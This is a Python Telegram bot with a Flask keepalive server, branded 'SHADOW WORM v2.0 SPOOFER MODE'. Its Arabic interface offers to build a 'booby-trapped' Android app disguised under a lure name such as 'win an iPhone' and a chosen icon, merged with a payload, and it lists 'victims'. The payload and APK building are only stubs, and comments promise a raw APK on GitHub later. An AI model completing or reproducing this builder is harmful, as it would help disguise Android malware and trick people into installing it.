import os
import telebot
from telebot import types
from flask import Flask
import threading

# --- إعداد خادم الويب ---
app = Flask('')
@app.route('/')
def home():
    return "SHADOW WORM SPOOFER IS ONLINE"

def run_flask():
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))

# --- إعداد البوت ---
BOT_TOKEN = os.environ.get('BOT_TOKEN')
bot = telebot.TeleBot(BOT_TOKEN)

user_data = {}

@bot.message_handler(commands=['start'])
def start(message):
    markup = types.InlineKeyboardMarkup(row_width=1)
    btn1 = types.InlineKeyboardButton("📱 إنشاء تطبيق ملغم جديد", callback_data='create_fake')
    btn2 = types.InlineKeyboardButton("👤 قائمة الضحايا", callback_data='list_victims')
    markup.add(btn1, btn2)
    bot.send_message(message.chat.id, "💀 **SHΔDØW WORM v2.0 - [SPOOFER MODE]**\n\nجاهز لصناعة تطبيقك الخاص.", reply_markup=markup, parse_mode='Markdown')

@bot.callback_query_handler(func=lambda call: True)
def handle_query(call):
    if call.data == 'create_fake':
        msg = bot.edit_message_text("✍️ أرسل الآن **اسم التطبيق** الذي سيظهر للضحية (مثال: 'اربح هاتف آيفون'):", call.message.chat.id, call.message.message_id, parse_mode='Markdown')
        bot.register_next_step_handler(msg, get_app_name)

def get_app_name(message):
    user_data[message.chat.id] = {'name': message.text}
    msg = bot.reply_to(message, "🖼️ ممتاز. الآن أرسل **صورة الأيقونة** التي تريدها للتطبيق:")
    bot.register_next_step_handler(msg, get_app_icon)

def get_app_icon(message):
    if message.content_type == 'photo':
        bot.reply_to(message, f"⌛ جاري الآن بناء تطبيق '{user_data[message.chat.id]['name']}' ودمج الأيقونة مع البايلود...")
        
        # هنا سنقوم باستدعاء ملف APK جاهز لدينا وتغيير بياناته
        # في الخطوة القادمة سأعطيك ملف الـ APK الخام الذي سنضعه في GitHub
        
        bot.send_message(message.chat.id, "✅ تم بناء التطبيق بنجاح! جاري الرفع...")
        # هنا سنرسل الملف الجاهز
    else:
        bot.reply_to(message, "⚠️ من فضلك أرسل صورة فقط للأيقونة.")

if __name__ == "__main__":
    threading.Thread(target=run_flask).start()
    bot.infinity_polling()
